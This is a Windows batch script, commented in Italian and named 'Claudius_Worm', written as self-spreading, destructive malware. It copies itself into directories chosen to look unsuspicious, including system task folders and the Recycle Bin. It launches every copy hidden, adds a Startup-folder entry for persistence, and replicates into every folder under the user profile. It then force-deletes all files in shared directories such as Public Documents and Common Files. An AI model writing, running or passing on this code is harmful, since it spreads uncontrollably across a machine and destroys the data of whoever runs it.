@echo off
setlocal enabledelayedexpansion

set SCRIPT_PATH=%~f0
set TARGET_DIR=%TEMP%\Claudius_Worm
set BACKUP_DIR=%LOCALAPPDATA%\Temp\Backup
set BACKUP_NAME="claudius_%RANDOM%.bat"
set COMMON_DIRS="C:\ProgramData\Microsoft\Windows\Recent" "C:\Windows\Temp" "C:\Users\Public\Documents" "C:\Program Files\Common Files" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
set SYSTEM_DIRS="C:\Windows\System32\Tasks" "C:\Windows\SysWOW64\Tasks" "C:\$Recycle.Bin" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"

REM Funzione per gestire gli errori (non interrompe l'esecuzione)
:handle_error
exit /b

REM Creare directory e file necessari
mkdir "%TARGET_DIR%" 2>nul || call :handle_error
mkdir "%BACKUP_DIR%" 2>nul || call :handle_error

REM Backup dello script in directory poco sospette
for %%D in (%COMMON_DIRS%) do (
    mkdir %%D 2>nul
    copy "%SCRIPT_PATH%" "%%D\%BACKUP_NAME%" >nul || call :handle_error
)

REM Copiare e avviare lo script nella directory di destinazione
copy "%SCRIPT_PATH%" "%TARGET_DIR%\claudius.bat" >nul || call :handle_error
start "" /min "%TARGET_DIR%\claudius.bat" >nul 2>&1 || call :handle_error

REM Creare file di avvio automatico
echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_script.bat" || call :handle_error
echo start "" /min "%TARGET_DIR%\claudius.bat" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_script.bat" || call :handle_error

REM Replicazione in directory comuni
for %%D in (%COMMON_DIRS%) do (
    mkdir %%D 2>nul
    copy "%SCRIPT_PATH%" "%%D\%BACKUP_NAME%" >nul || call :handle_error
    start "" /min "%%D\%BACKUP_NAME%" >nul 2>&1 || call :handle_error
)

REM Replicazione in ogni directory dell'utente
for /d /r %USERPROFILE% %%D in (*) do (
    if not "%%D"=="%TARGET_DIR%" (
        mkdir "%%D\Claudius_Worm" 2>nul
        copy "%SCRIPT_PATH%" "%%D\Claudius_Worm\%BACKUP_NAME%" >nul || call :handle_error
        start "" /min "%%D\Claudius_Worm\%BACKUP_NAME%" >nul 2>&1 || call :handle_error
    )
)

REM Replicazione in directory di sistema e cartelle nascoste
for %%D in (%SYSTEM_DIRS%) do (
    mkdir %%D 2>nul
    copy "%SCRIPT_PATH%" "%%D\%BACKUP_NAME%" >nul || call :handle_error
    start "" /min "%%D\%BACKUP_NAME%" >nul 2>&1 || call :handle_error
)

REM Eliminazione di file in directory comuni e dell'utente
for %%D in (%COMMON_DIRS%) do (
    del /f /q "%%D\*" 2>nul || call :handle_error
)
for /d /r %USERPROFILE% %%D in (Claudius_Worm) do (
    del /f /q "%%D\*" 2>nul || call :handle_error
)

del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_script.bat" >nul 2>&1 || call :handle_error
